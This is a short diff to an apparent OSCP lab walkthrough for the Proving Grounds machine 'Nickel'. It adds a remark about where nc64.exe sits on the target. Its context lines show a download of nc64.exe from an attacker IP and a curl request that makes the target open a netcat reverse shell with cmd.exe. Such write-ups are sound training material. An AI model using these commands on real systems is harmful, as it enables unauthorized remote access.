@@ -211,7 +211,7 @@ curl.exe -o nc64.exe http://192.168.49.114/nc64.exe
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Nickel/Nickel_2021.11.06_23h06m09s_015_.png)
 
-Because we have to pass the command through HTTP serivce, we have to encode our command.
+Because we have to pass the command through HTTP serivce, we have to encode our command. (Note the location of the ```nc64.exe```)
 
 ```
 curl-X GET http://nickel/?/Users/ariah/Documents/nc64.exe -e cmd.exe 192.168.49.114 80
